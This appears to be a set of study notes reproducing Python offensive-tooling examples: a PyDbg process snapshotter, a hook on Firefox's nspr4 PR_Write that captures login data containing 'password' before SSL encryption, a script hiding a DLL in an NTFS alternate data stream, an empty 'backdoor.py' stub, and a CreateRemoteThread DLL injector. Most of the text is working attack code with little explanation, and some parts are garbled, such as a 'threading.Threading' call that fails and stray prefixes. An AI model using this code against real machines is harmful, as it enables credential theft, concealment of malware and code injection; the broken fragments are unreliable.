# obtaining process snapshot

v1. get an accurate picture of what the target process was up
to at a precise moment.
2. obtain all of the process's memory pages and their contents.
3. Before we can take the process snapshots, we have to suspend all threads
of execution so that they don’t change data or state while the snapshot is being
taken.


In PyDbg, `suspend_all_threads()`.


```python:n
from pydbg import *
from pydbg.defines import *
import threading
import time
import sys

class snapshotter(object):
    def __init__(self,exe_path):
        self.exe_path = exe_path
        self.pid = None
        self.dbg = None
        self.running = True

        # Start the debugger thread, and loop until it sets the PID of our target process
        pydbg_thread = threading.Thread(target=self.start_debugger)
        pydbg_thread.setDaemon(0)
        pydbg_thread.start()

        while self.pid == None:
            time.sleep(1)

        # we now have a PID and the target is running;
        # let's get a second thread running to do the snapshots
        monitor_thread = threading.Threading(target=self.monitor_debugger)
        monitor_thread.setDaemon(0)
        monitor_thread.start()

    def monitor_debugger(self):
        while self.running == True:
            input = raw_input("Enter: 'snap','restore' or 'quit'")
            input = input.lower().strip()

            if input == "quit":
                print "[*] Exiting the snapshotter."
                self.running = False
                self.dbg.terminate_process()
            elif input == "snap":
                print "[*] Suspending all threads."
                self.dbg.suspend_all_threads()

                print "[*] Obtaining snapshot."
                self.dbg.process_snapshot()

                print "[*] Resuming operation."
                self.dbg.resume_all_threads()

            elif input == "restore":
                print "[*] Suspending all threads."
                self.dbg.suspend_all_threads()
                print "[*] Restoring snapshot."
                self.dbg.process_restore()
                print "[*] Resuming operation."
                self.dbg.resume_all_threads()
    def start_debugger(self):
        self.dbg = pydbg()
        pid = self.dbg.load(self.exe_path)
        self.pid = self.dbg.pid
        self.dbg.run()

exe_path = "C:\\WINDOWS\\System32\\calc.exe"
snapshotter(exe_path)
    ```

# hook firefox

First let’s verify that we can actually see the data we are interested in. Open
the Firefox web browser, and navigate to one of my favorite sites, https://www
.openrce.org/. Once you have accepted the site’s SSL certificate and the page
has loaded, attach Immunity Debugger to the firefox.exe process and set a break-
point on nspr4.PR_Write. In the top-right corner of the OpenRCE website is a
login form; set a username to test and a password to test and click the
Login button. The breakpoint you set should be hit almost immediately;
keep pressing F9 and you’ll continually see the breakpoint being hit.
Eventually, you will see a string pointer on the stack that dereferences to
something like this:
[ESP + 8] => ASCII "username=test&password=test&remember_me=on"


firefox_hook.py
```python:n
from pydbg import *
from pydbg.defines import *

import utils
import sys

dbg = pydbg()
found_firefox = False

# let's set a global pattern that we can make the hook search for
pattern = "password"

# this is our entry hook callback function the argument we are interested in is args[1]
def ssl_sniff(dbg,args):
    # now we read out the memory pointed to by the second argument
    # it is stored as an ASCII string, so we'll loop on a read until we reach a NULL byte
    buffer = ""
    offset = 0
    while 1:
        byte = dbg.read_process_memory(args[1]+offset,1)
        if byte != "\x00":
            buffer += byte
            offset += 1
            continue
        else:
            break

    if pattern in buffer:
        print "Pre-Encrypted: %s" % buffer
    return DBG_CONTINUE

# Quick and dirty process enumeration to find firefox.exe
for (pid,name) in dbg.enumerate_processes():
    if name.lower() == "firefox.exe":
        found_firefox = True
        hooks = utils.hook_container()

        dbg.attach(pid)
        print "[*] Attaching to firefox.exe with PID: %d" % pid

        # Resolve the function address
        hook_address = dbg.func_resolve_debuggee("nspr4.dll","PR_Write")

        if hook_address:
            # Add the hook to the container. We aren't interested in using an exit callback, so we set it to None.
            hooks.add(dbg,hook_address,2,ssl_sniff,None)
            print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address
            break
        else:
            print "[*] Error: Couldn't resolve hook address."
            sys.exit(-1)
if found_firefox:
    print "[*] Hooks set, continuing process."
    dbg.run()
else:
    print "[*] Error: Couldn't find the firefox.exe process."
    sys.exit(-1)
```


# file hider
file_hider.py
```python:n
import sys
# Reae in the DLL
fd = open(sys.argv[1], "rb")
dll_contents = fd.read()
fd.close()

print "[*] FileSize: %d" % len(dll_contents)

# Now write it out to the ADS
fd = open("%s:%s" % (sys.argv[2],sys.argv[1]), "wb")
fd.write(dll_contents)
fd.close()
```


backdoor.py
```python:n
# this library contains all the necessary defines for process creation

```

# dll injector
dll_injector.py

```python:n
import sys
from ctypes import *
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
pid = sys.argv[1]
dll_path = sys.argv[2]
dll_len = len(dll_path)

# Get a handle to the process we are injecting into.
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,int(pid))

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

# Allocate some space for the DLL path
arg_address = kernel32.VirtualAllocEx(h_process,0,dll_len,VIRTUAL_MEM,PAGE_READWRITE)

# Write the DLL path into the allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process,arg_address,dll_path,dll_len,byref(written))

# We need to resolve the address for LoadLibraryA
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")

# Now we try to create the remote thread, with the entry point set
# to LoadLibraryA and a Pointer to the DLL path as its single parameter
thread_id  = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process,
                                None,
                                0,
                                h_loadlib,
                                arg_address,
                                0,
                                byref(thread_id)):
    print "[*] Failed to inject the DLL. Exiting."
    sys.exit(0)
print "[*] Remote thread with ID 0x%08x created." % thread_id.value

```
